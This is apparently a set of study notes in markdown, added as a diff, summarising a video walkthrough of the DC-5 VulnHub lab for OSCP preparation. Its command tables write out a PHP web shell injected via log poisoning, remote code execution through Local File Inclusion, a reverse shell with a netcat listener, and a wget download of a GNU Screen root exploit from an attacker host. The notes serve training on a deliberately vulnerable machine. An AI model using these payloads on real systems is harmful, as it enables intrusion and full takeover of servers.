@@ -1,0 +1,58 @@
+The video provided, "DC-5 Walkthrough with S1REN," demonstrates a step-by-step penetration test of the DC-5 VulnHub machine, covering essential methodology for the OSCP exam, including detailed enumeration, web application parameter discovery, Local File Inclusion (LFI) exploitation via log poisoning for Remote Code Execution (RCE), and Linux privilege escalation.
+
+Here are the comprehensive notes and commands from the walkthrough.
+
+-----
+
+## 📝 OSCP Methodology Notes
+
+| Phase | Key Takeaway / Concept | Vulnerability Exploited |
+| :--- | :--- | :--- |
+| **Enumeration** | **Always be thorough.** The core application running on port 80 was a custom web app. Directory fuzzing and Nikto scans were essential to find potential entry points. | N/A |
+| **Web App Recon** | **Look for hidden parameters.** Use specialized wordlists (`burp-parameter-names.txt`) to find non-exposed GET/POST parameters in processing scripts (e.g., `thankyou.php`). | **Hidden Parameter Discovery** ([[51:16](http://www.youtube.com/watch?v=21iwp7ee-as&t=3076)]) |
+| **Initial Foothold** | **Verify LFI and exploit with Log Poisoning.** The discovered `file` parameter was vulnerable to Local File Inclusion. Since the target was running Nginx, a malicious PHP payload was injected into the accessible web access log, which was then included via LFI to achieve RCE. | **Local File Inclusion (LFI)** & **Log Poisoning** ([[01:05:02](http://www.youtube.com/watch?v=21iwp7ee-as&t=3902)], [[01:05:57](http://www.youtube.com/watch?v=21iwp7ee-as&t=3957)]) |
+| **Privilege Escalation** | **Search for vulnerable SUID binaries.** After gaining a shell, thorough enumeration revealed an outdated, SUID-enabled binary: **GNU Screen 4.5.0**. This is a classic example of a "low-hanging fruit" escalation vector. | **Vulnerable SUID Binary (GNU Screen 4.5.0)** ([[01:23:39](http://www.youtube.com/watch?v=21iwp7ee-as&t=5019)]) |
+
+-----
+
+## 💻 Essential Commands Reference
+
+The commands are organized by the phase of the penetration test.
+
+### Phase 1: Initial Enumeration & Discovery
+
+| Tool | Command | Purpose | Timestamp |
+| :--- | :--- | :--- | :--- |
+| **Nmap** | `nmap -p- -sC -sV [Target IP]` | Perform a full port sweep and run default scripts (`-sC`) and service version detection (`-sV`). | [[30:14](http://www.youtube.com/watch?v=21iwp7ee-as&t=1814)] |
+| **Wfuzz (Files)** | `wfuzz -c -z file /opt/seclists/Discovery/Web-Content/raft-large-files.txt -D "H 404" http://[Target IP]/FUZZ` | Fuzz for files and filter out 404 responses. | [[34:04](http://www.youtube.com/watch?v=21iwp7ee-as&t=2044)] |
+| **Nikto** | `nikto --host [Target IP] -C all` | Scan the web server for known vulnerabilities and configuration issues. | [[39:00](http://www.youtube.com/watch?v=21iwp7ee-as&t=2340)] |
+| **Wfuzz (Parameters)** | `wfuzz -c -z file /opt/seclists/Discovery/Web-Content/burp-parameter-names.txt -D "H 851" http://[Target IP]/thankyou.php?FUZZ=data` | Discover hidden GET parameters, filtering by an appropriate response size. (Discovered `file`) | [[53:52](http://www.youtube.com/watch?v=21iwp7ee-as&t=3232)] |
+
+-----
+
+### Phase 2: Local File Inclusion (LFI) & RCE
+
+The vulnerability was found on the `thankyou.php` script using the new `file` parameter.
+
+| Step | Command / Technique | Purpose | Timestamp |
+| :--- | :--- | :--- | :--- |
+| **Poison Log (Injection)** | `netcat -v [Target IP] 80` then manually type: `GET /<?php passthru($_GET['offsec']);?> HTTP/1.1` | Inject a malicious PHP payload (`passthru` for command execution) into the Nginx `access.log` file by disguising it as an HTTP GET request. | [[01:03:11](http://www.youtube.com/watch?v=21iwp7ee-as&t=3791)] |
+| **Verify RCE** | `http://[Target IP]/thankyou.php?file=/var/log/nginx/access.log&offsec=ping%20-c3%20[Attacker%20IP]` | Include the poisoned log file using the LFI, which executes the injected PHP, which in turn executes the `ping` command passed via the `offsec` GET parameter. | [[01:06:03](http://www.youtube.com/watch?v=21iwp7ee-as&t=3963)], [[01:11:04](http://www.youtube.com/watch?v=21iwp7ee-as&t=4264)] |
+| **Set up Listener** | `netcat -lvnp 31337` | Set up a listener on the attacker machine to catch the reverse shell connection. | [[01:13:00](http://www.youtube.com/watch?v=21iwp7ee-as&t=4380)] |
+| **Execute Reverse Shell** | `http://[Target IP]/thankyou.php?file=/var/log/nginx/access.log&offsec=[URL-ENCODED BASH SHELL]` | Execute a URL-encoded Bash reverse shell payload via the `offsec` parameter to gain a `www-data` shell. | [[01:12:47](http://www.youtube.com/watch?v=21iwp7ee-as&t=4367)] |
+| **Stable Shell** | `python3 -c 'import pty; pty.spawn("/bin/bash")'`<br>`<kbd>Ctrl+Z</kbd>`<br>`stty raw -echo`<br>`fg`<br>`reset` | Upgrade the unstable netcat shell to a stable, interactive Bash shell. | [[01:14:01](http://www.youtube.com/watch?v=21iwp7ee-as&t=4441)], [[01:14:36](http://www.youtube.com/watch?v=21iwp7ee-as&t=4476)] |
+
+-----
+
+### Phase 3: Privilege Escalation (Post-Exploitation)
+
+The escalation was achieved using a known exploit for the `screen` binary.
+
+| Step | Command / Binary | Purpose | Timestamp |
+| :--- | :--- | :--- | :--- |
+| **Find SUID/GUIDs** | (Implied) `find / -type f -perm /4000 2>/dev/null` | Search the file system for binaries with SUID/GUID bits set, revealing the **`/usr/bin/screen`** binary. | [[01:20:19](http://www.youtube.com/watch?v=21iwp7ee-as&t=4819)] |
+| **Identify Exploit** | `searchsploit screen 4.5.0 privilege` | Search Exploit-DB for a local privilege escalation exploit for the found binary version. (Found: **41154.sh**) | [[01:24:05](http://www.youtube.com/watch?v=21iwp7ee-as&t=5045)] |
+| **Transfer Exploit** | `wget http://[Attacker IP]:8000/41154.sh` | Use a Python simple HTTP server to transfer the exploit files to a writable directory (`/dev/shm` or `/var/tmp`) on the target machine. | [[01:31:02](http://www.youtube.com/watch?v=21iwp7ee-as&t=5462)] |
+| **Compile & Execute** | `chmod +x 41154.sh`<br>`./41154.sh` | Run the exploit script, which compiles a malicious shared library (`.so`) and uses the `ld.so.preload` environment variable to execute the library with root privileges. | [[01:32:54](http://www.youtube.com/watch?v=21iwp7ee-as&t=5574)] |
+| **Final Flag** | `cat /root/the_flag.txt` | Read the final flag after successfully escalating to the **root** user. | [[01:33:53](http://www.youtube.com/watch?v=21iwp7ee-as&t=5633)] |
+http://googleusercontent.com/youtube_content/0
